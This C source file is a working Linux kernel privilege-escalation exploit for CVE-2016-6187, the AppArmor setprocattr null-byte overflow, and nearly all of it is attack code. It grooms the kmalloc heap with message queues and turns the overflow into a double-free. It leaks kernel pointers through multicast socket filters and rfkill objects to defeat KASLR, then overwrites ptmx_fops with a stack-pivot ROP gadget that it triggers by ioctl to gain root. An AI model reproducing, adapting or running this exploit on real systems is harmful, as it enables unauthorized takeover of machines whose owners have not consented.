// backup: exploit_5.c

#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <inttypes.h>
#include <stdbool.h>
#include <string.h>
#include <sched.h>
#include <errno.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>

#define aslr_addr(offs) (kptr_kbase + (offs))

#define N_PAGES    (7)
#define N_MESSAGES ((N_PAGES * 4096) / 0x80) + 1

#define MTYPE_DEFAULT 0xdeadbeef

#define PTMX_FOPS_OFFS            0x110b0c0
#define RFKILL_FDS_OFFS           0x0ef2b30
#define ROP_PUSH_RDX_POP_RSP_OFFS 0x07bb93a

#define PTMX_FOPS            aslr_addr(PTMX_FOPS_OFFS)
#define RFKILL_FDS           aslr_addr(RFKILL_FDS_OFFS)
#define ROP_PUSH_RDX_POP_RSP aslr_addr(ROP_PUSH_RDX_POP_RSP_OFFS)

typedef enum status {

    STATUS_SUCCESS,
    STATUS_FAILURE

} status_t;

typedef enum msgsz {

    MSGSZ_64,
    MSGSZ_96,
    MSGSZ_128,
    MSGSZ_ENUM_END

} msgsz_t;

typedef struct msg_buffer {

    long mtype;
    char mtext[0x100];

} msg_buffer_t;

static size_t msg_request_size[] = {

    [MSGSZ_64]  = 0x01,
    [MSGSZ_96]  = 0x11,
    [MSGSZ_128] = 0x31
};

static inline void id(void) {

    printf("uid=%d, euid=%d\n", getuid(), geteuid());
}

static int message_add(const int msqid, const msgsz_t size, const char* text, const long mtype) {

    msg_buffer_t msgbuf = { 0 };

    if (size < 0 || size >= MSGSZ_ENUM_END)
        return -1;

    msgbuf.mtype = mtype;
    strncpy(msgbuf.mtext, text, strlen(text));

    if (msgsnd(msqid, &msgbuf, msg_request_size[size], IPC_NOWAIT) < 0)
        printf("Could not add message (%d, %s, 0x%lx)\n", msqid, text, mtype);

    return 0;
}

static int message_del(const int msqid, const size_t size, const long mtype, msg_buffer_t* msgbuf) {

    msg_buffer_t* msgp         = msgbuf;
    msg_buffer_t  msgbuf_local = { 0 };

    if (size < 0 || size >= MSGSZ_ENUM_END)
        return -1;

    if (msgbuf == NULL)
        msgp = &msgbuf_local;

    if (msgrcv(msqid, msgp, msg_request_size[size], mtype, IPC_NOWAIT) < 0)
        printf("Could not delete message (%d, 0x%lx)\n", msqid, mtype);

    return 0;
}

static int sock_dgram_mcast(void) {

    int              sock;
    struct ipv6_mreq mc_group;

    if ((sock = socket(AF_INET6, SOCK_DGRAM, 0)) < 0)
        return -1;

    mc_group.ipv6mr_interface = 2;
    inet_pton(AF_INET6, "ffff::9", &mc_group.ipv6mr_multiaddr);

    if (setsockopt(sock, IPPROTO_IPV6, IPV6_JOIN_GROUP, &mc_group, sizeof(mc_group)) != 0) {

        close(sock);
        return -1;
    }

    return sock;
}

static int destroy_mcast_sockets(int* sock, const int numsock) {

    for (int i = 0; i < numsock; i++)
        close(sock[i]);
}

static int create_mcast_sockets(int* sock, const int numsock) {

    for (int i = 0; i < numsock; i++) {

        if ((sock[i] = sock_dgram_mcast()) < 0) {

            destroy_mcast_sockets(sock, i);
            return -1;
        }
    }

    return 0;
}

static void group_filter_init(struct group_filter* gsf, const uint32_t numsrc) {

    struct sockaddr_in6* sin6ptr;

    gsf->gf_interface         = 2;
    gsf->gf_numsrc            = numsrc;
    gsf->gf_fmode             = MCAST_EXCLUDE;

    sin6ptr = (struct sockaddr_in6*) &gsf->gf_group;
    sin6ptr->sin6_family = AF_INET6;

    inet_pton(PF_INET6, "ffff::9", &sin6ptr->sin6_addr);
}

int main(void) {

    cpu_set_t            cpu_set;
    char                 proc_attr_curr[64];
    unsigned int         attr_current_fd, rfkill_fd, tty_fd;
    int                  msqid[2];
    msg_buffer_t         msgbuf = { 0 };
    char                 wbuf[0x80];
    int                  sock[3];
    uint8_t              gsf_block[GROUP_FILTER_SIZE(6)];
    socklen_t            optlen = sizeof(gsf_block);
    struct group_filter* gsf;
    struct sockaddr_in6* sin6ptr;
    uintptr_t            kptr_kmalloc128, kptr_rfkill_fds, kptr_kbase;
    status_t             exploit_status;

    id();

    printf("Hmmm...Boring unprivileged shell :(\n");
    printf("Let's try to change that!\n");

    /*
     * Pin exploit to CPU 0 since we are about
     * to rely on per-CPU freelists.
     * */

    CPU_ZERO(&cpu_set);
    CPU_SET(0, &cpu_set);

    sched_setaffinity(0, sizeof(cpu_set_t), &cpu_set);

    /*
     * prepare a few sockets and join a multicast group. We will
     * use the group filter later to leak some kernel pointers.
     * */

    if (create_mcast_sockets(sock, 3) < 0) {

        printf("Could not init socket: %s\n", strerror(errno));
        return STATUS_FAILURE;
    }

    gsf = (struct group_filter*) gsf_block;

    /*
     * open /dev/ptmx for later
     * */

    if ((tty_fd = open("/dev/ptmx", O_RDWR)) < 0) {

        printf("Could not open /dev/ptmx\n");
        return STATUS_FAILURE;
    }

    /*
     * prepare everything needed in order to trigger CVE-2016-6187
     * */

    sprintf(proc_attr_curr, "/proc/%d/attr/current", getpid());
    printf("Opening %s...\n", proc_attr_curr);

    if ((attr_current_fd = open(proc_attr_curr, O_RDWR)) < 0) {

        printf("Could not open: %s\n", proc_attr_curr);
        return STATUS_FAILURE;
    }

    /*
     * open two new message queues. We will use them to groom
     * the heap and increase overall exploit reliability.
     * */

    msqid[0] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    printf("Opened new message queue. MSQID=%d\n", msqid[0]);

    msqid[1] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    printf("Opened new message queue. MSQID=%d\n", msqid[1]);

    /*
     * groom the heap by spamming the kernel with a bunch of messages
     * */

    printf("Populating message queue (kmalloc-128)...\n");

    for (int i = 0; i < N_MESSAGES; i++)
        message_add(msqid[0], MSGSZ_128, "A", MTYPE_DEFAULT);

    printf("Populating message queue (kmalloc-96)...\n");

    for (int i = 0; i < N_MESSAGES * 2; i++)
        message_add(msqid[1], MSGSZ_96, "A", MTYPE_DEFAULT);

    /*
     * now that we have groomed our heap, let's setup the
     * exploit section
     * */

    printf("Setting up exploit sections...\n");

    message_add(msqid[0], MSGSZ_128, "SECTION 1",   MTYPE_DEFAULT);
    message_add(msqid[0], MSGSZ_128, "TO_BE_FREED", 1);
    message_add(msqid[0], MSGSZ_128, "TO_BE_FREED", 2);
    message_add(msqid[0], MSGSZ_128, "DF",          3);
    message_add(msqid[0], MSGSZ_128, "TO_BE_FREED", 4);
    message_add(msqid[0], MSGSZ_128, "GUARD",       MTYPE_DEFAULT);

    message_add(msqid[0], MSGSZ_128, "SECTION 2",   MTYPE_DEFAULT);
    message_add(msqid[0], MSGSZ_128, "TO_BE_FREED", 5);
    message_add(msqid[0], MSGSZ_128, "TO_BE_FREED", 6);
    message_add(msqid[0], MSGSZ_128, "DF",          7);
    message_add(msqid[0], MSGSZ_128, "TO_BE_FREED", 8);
    message_add(msqid[0], MSGSZ_128, "GUARD",       MTYPE_DEFAULT);

    message_add(msqid[1], MSGSZ_96,  "SECTION 3",   MTYPE_DEFAULT);
    message_add(msqid[1], MSGSZ_96,  "PIVOT",       1);
    message_add(msqid[1], MSGSZ_96,  "PIVOT",       2);
    message_add(msqid[1], MSGSZ_96,  "PIVOT",       3);
    message_add(msqid[1], MSGSZ_96,  "PIVOT",       4);
    message_add(msqid[1], MSGSZ_96,  "PIVOT",       5);
    message_add(msqid[0], MSGSZ_96,  "GUARD",       MTYPE_DEFAULT);

    /*
     * free'ing all messages that were tagged with a free tag.
     *
     * Following part is critical. We try to perform the heap operations as
     * atomic as possible and avoid unnecessary syscalls.
     * */

    printf("Requesting messages that were marked as to be free'd...\n");
    printf("Pssst...Going silent during critical section...\n");

    memset(wbuf, 'A', 0x80 * sizeof(char));

    message_del(msqid[0], MSGSZ_128, 4, NULL);
    message_del(msqid[0], MSGSZ_128, 2, NULL);
    message_del(msqid[0], MSGSZ_128, 1, NULL);

    /*
     * now quickly allocate the vulnerable buffer and
     * trigger the nullbyte overflow in apparmor_setprocattr!
     *
     * Remember, that the vulnerable buffer will be free'd
     * again once we return from the write syscall.
     * */
    write(attr_current_fd, wbuf, 0x80);

    /*
     * with a bit luck, the previous nullbyte overflow has
     * overwritten the LSB of the freelist next pointer of message #2,
     * so that it now points to the still alloc'd message #3
     *
     * We can then regularly free message #3 in order to escalate
     * to a double-free primitive.
     *
     * The resulting situation is similar to the fastbin dup attack
     * against glibc's ptmalloc-2 allocator.
     *
     * 1 -> 2 -> 4       // non corrupted freelist
     * 1 -> 2 -> 3       // freelist after nullbyte overflow
     * 3 -> 1 -> 2 -> 3  // freelist after free'ing message #3
     *
     * This allows us to allocate two overlapping structures within the
     * kmalloc-128 cache.
     * */

    /*
     * double free message #3 
     * */
    message_del(msqid[0], MSGSZ_128, 3, NULL);

    /*
     * and now allocate a structure that lets us copy back its content
     * to userspace.
     *
     * ip6_sf_socklist is the perfect fit for our needs. It is an elastic object
     * and can be alloc'd via setsockopt using the MCAST_MSFILTER option on the
     * IPPROTO_IPV6 level. Its content can be read back via getsockopt.
     * */

    group_filter_init(gsf, 6);

    if (setsockopt(sock[0], IPPROTO_IPV6, MCAST_MSFILTER, gsf, optlen) != 0)
        printf("setsockopt: %s\n", strerror(errno));

    /*
     * pop message #1 from the freelist
     * */
    message_add(msqid[0], MSGSZ_128, "A", 1);

    /*
     * pop message #2 from the freelist
     * */
    message_add(msqid[0], MSGSZ_128, "A", 2);

    /*
     * The following rfkill_data object will overlap our previously
     * allocated ip6_sf_socklist object, which we will use to leak some
     * rfkill_data pointers back into userspace.
     * */

    if ((rfkill_fd = open("/dev/rfkill", O_RDWR)) < 0)
        printf("Could not open /dev/rfkill\n");

    /*
     * leaking rfkill_data.list.prev and rfkill_data.events.prev...
     *
     * TODO: maybe check exploit status here and if needed,
     * restart the exploit. If the leak does not appear to be a valid
     * kernelspace address, we can safely assume, that the target LSB
     * was already zero.
     * */
    printf("Leaking kernel pointers...\n");

    if (getsockopt(sock[0], IPPROTO_IPV6, MCAST_MSFILTER, gsf, &optlen) != 0)
        printf("getsockopt: %s\n", strerror(errno));

    sin6ptr = (struct sockaddr_in6*) &gsf->gf_slist[0];
    kptr_rfkill_fds = *((uintptr_t*) &sin6ptr->sin6_addr);

    sin6ptr = (struct sockaddr_in6*) &gsf->gf_slist[1];
    kptr_kmalloc128 = *((uintptr_t*) &sin6ptr->sin6_addr) - 0x10;

    /*
     * we can derive the kernel text base from global
     * data pointers in order to defeat KASLR
     * */
    kptr_kbase = kptr_rfkill_fds - RFKILL_FDS_OFFS;

    // test
    if (kptr_rfkill_fds == 0x0) {

        printf("Bad luck. Exploit failed...please retry!\n");
        return STATUS_FAILURE;
    }

    printf("rfkill_data object (kmalloc-128): %p\n", kptr_kmalloc128);
    printf("rfkill_fds list head: %p\n", kptr_rfkill_fds);
    printf("kernel base (derived from rfkill_fds): %p\n", kptr_kbase);

    /*
     * now that we have leaked some kernel pointers, let's try to hijack
     * the control flow by overwriting registered callbacks in ptmx_fops.
     *
     * For that, we need an arbitrary write against ptmx_fops:
     *
     * We will pivot from kmalloc-128 to kmalloc-96, once again, by
     * corrupting the kmalloc-128 freelist and forcing the allocator
     * to return us a 96-byte chunk when we actually request 128-bytes.
     *
     * We can leverage the size mismatch and overflow into the freelist
     * pointer of the adjacent chunk in order to replace it with an
     * arbitrary address - in our case, ptmx_fops.
     *
     * If properly groomed, the next 96-byte allocation will overlap
     * with ptmx_fops, allowing us to overwrite its callbacks.
     * */

    /*
     * 5 -> 6 -> 8      // non corrupted freelist
     * 5 -> 6 -> 7      // freelist after nullbyte overflow
     * 7 -> 5 -> 6 -> 7 // freelist after free'ing message #7
     * */

    message_del(msqid[0], MSGSZ_128, 8, NULL);
    message_del(msqid[0], MSGSZ_128, 6, NULL);
    message_del(msqid[0], MSGSZ_128, 5, NULL);

    /*
     * CVE-2016-6187
     * */
    write(attr_current_fd, wbuf, 0x80);

    /*
     * double free message #7 
     * */
    message_del(msqid[0], MSGSZ_128, 7, NULL);

    /*
     * reclaim message #7 and link it into the end of the queue
     * */
    message_add(msqid[0], MSGSZ_128, "A", 7);

    /*
     * overwrite the freelist next pointer of message #7
     * with the address of one of the pivot messages from
     * the second message queue by...
     * */

    /*
     * ...deleting them from the second queue in reverse order...
     * */
    message_del(msqid[1], MSGSZ_96, 5, NULL);
    message_del(msqid[1], MSGSZ_96, 4, NULL);
    message_del(msqid[1], MSGSZ_96, 3, NULL);
    message_del(msqid[1], MSGSZ_96, 2, NULL);
    message_del(msqid[1], MSGSZ_96, 1, NULL);

    /*
     * ...and linking one of them back into the first queue
     * */
    message_add(msqid[0], MSGSZ_96, "PIVOT", 9);

    /*
     * the kmalloc-128 freelist now looks like this...
     *
     * 5 -> 6 -> 7 -> 9 (kmalloc-96) -> msg_queue.q_messages
     * */

    message_add(msqid[0], MSGSZ_128, "A", 5);
    message_add(msqid[0], MSGSZ_128, "A", 6);
    message_add(msqid[0], MSGSZ_128, "A", 7);

    /*
     * ...and after reclaiming message 5, 6 and 7
     *
     * 9 (kmalloc-96) -> msg_queue.q_messages
     *
     * Now overflow into the next free'd 96-byte chunk in order
     * to overwrite its next pointer and enable arbitrary allocations.
     *
     * Again, we will use the ip6_sf_socklist object. A socklist with
     * 6 elements will be serviced by kmalloc-128.
     * */

    group_filter_init(gsf, 6);

    sin6ptr = (struct sockaddr_in6*) &gsf->gf_slist[5];
    *((uintptr_t*) &sin6ptr->sin6_addr.__in6_u.__u6_addr8[8]) = PTMX_FOPS;

    if (setsockopt(sock[1], IPPROTO_IPV6, MCAST_MSFILTER, gsf, optlen) != 0)
        printf("setsockopt: %s\n", strerror(errno));

    /*
     * allocate the recently overflowed chunk...
     * */
    message_add(msqid[1], MSGSZ_96, "A", MTYPE_DEFAULT);

    /*
     * ...and finally allocate ptmx_fops and set ptmx_fops.unlocked_ioctl
     * to our first rop gadget, which will pivot the stack to the
     * user supplied address in rdx
     *
     * ROP_PUSH_RDX_POP_RSP:
     *   push rdx
     *   mov edx, 0x415bffb7
     *   pop rsp
     *   pop rbp
     *   ret
     * */

    gsf->gf_numsrc = 4;

    sin6ptr = (struct sockaddr_in6*) &gsf->gf_slist[3];
    *((uintptr_t*) &sin6ptr->sin6_addr.__in6_u.__u6_addr8[8]) = ROP_PUSH_RDX_POP_RSP;

    if (setsockopt(sock[2], IPPROTO_IPV6, MCAST_MSFILTER, gsf, GROUP_FILTER_SIZE(4)) != 0)
        printf("setsockopt: %s\n", strerror(errno));

    /*
     * this gap here is a critical section. Let's hope there is
     * no other incoming ioctl on /dev/ptmx
     * */

    /*
     * trigger the rop chain. The address of the fake stack
     * is encoded in rdx (third parameter to ioctl)
     * */
    ioctl(tty_fd, 0xbeef, kptr_kmalloc128);

    return STATUS_SUCCESS;
}
